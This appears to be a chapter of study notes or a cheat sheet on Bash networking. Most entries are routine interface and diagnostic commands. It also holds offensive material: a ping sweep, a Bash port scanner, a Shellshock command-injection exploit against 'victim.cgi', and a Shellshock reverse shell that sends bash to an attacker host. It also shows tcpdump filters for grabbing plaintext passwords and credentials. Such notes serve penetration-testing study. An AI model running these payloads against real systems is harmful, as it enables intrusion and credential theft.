# Chapter 6: Bash Networking

Review your IP address: `ip address`

Install ipcalc: `sudo apt install -y ipcalc`

Install sipcalc: `sudo apt install -y sipcalc`

To determine how our network interface was configured, enter the command: `nmcli device show eth0`

Configure a static IP address: `sudo ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up`

Add a default gateway: `route add default gw 192.168.1.1`

List all network interfaces: `ip link`

Enable a down interface: `sudo ip link set eth0 up`

To view the IP address configuration of an interface: `ip address show eth0`

To ping a host by IP address or hostname: `ping www.google.com`

Trace the route to a destination: `traceroute www.google.com`

Lookup all IP addresses for a hostname: `nslookup google.com`

View the last 100 lines of syslog: `tail -n 100 /var/log/syslog`

View journald errors: `journalctl -r -p err`

Discover live hosts on a network: `for ip in 10.0.1.{1..254}; do ping -c 1 $ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & done`

Port scan with Bash:

```
#!/bin/bash
network="10.0.1"
ports=(22 80 443 445 3389)
for host in {1..254}; do
  ip="$network.$host"
  ping -c 1 $ip >/dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "$ip is up"
  fi
  for port in "${ports[@]}"; do
    timeout 1 bash -c "echo >/dev/tcp/$ip/$port" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo "port $port is open on $ip"
    fi
  done
done
```

Exploit Shellshock: `curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.2.10.1:8080/victim.cgi`

Get a reverse shell from Shellshock: `curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -l > /dev/tcp/10.2.10.99/4444 0<&1 2>&1" http://10.2.10.1:8080/victim.cgi`

Capture packets on a network interface: `sudo tcpdump -i eth0 -w packetcapture.pcap`

Detect plaintext HSRP password: `tcpdump -XX -r packetcapture.pcap udp port 1985 or udp port 2029 | grep -B4 cisco`

Detect LLMNR and NBT-NS: `tcpdump -r packetcapture.pcap udp port 137 or udp port 5355`

Detect plaintext credentials in HTTP: `sudo tcpdump -I eth0 -XX ‘tcp port 80’ | grep -i -B5 pass`

Install Tshark on Kali: `sudo apt install -y tshark`

Detect domain takeover opportunities: `sudo tshark -i eth0 -Y "dns.flags eq 0x8183"`

Display only source and destination addresses in Tshark output: `tshark -e ip.src -e ip.dst`

Filter Tshark for HTTP traffic: `tshark -Y "http"`

Display HTTP traffic originating from a specific IP address: `tshark -Y "http and ip.src == 192.168.1.100"`


